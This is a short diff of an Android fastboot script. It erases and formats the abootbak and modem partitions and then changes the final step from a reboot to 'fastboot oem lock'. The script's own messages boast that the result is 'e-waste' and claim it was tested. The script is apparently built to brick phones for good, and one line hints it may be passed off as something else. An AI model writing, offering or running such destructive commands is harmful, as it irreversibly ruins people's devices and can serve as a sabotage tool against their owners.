@@ -127,7 +127,7 @@ fastboot erase abootbak
 fastboot format abootbak
 fastboot erase modem
 fastboot format modem
-fastboot reboot
+fastboot oem lock
 
 echo If your bootloader was unlocked, congratulations! You now have e-waste! (i tested this and it works)
 echo If your device didn't work with this, maybe you got the wrong version
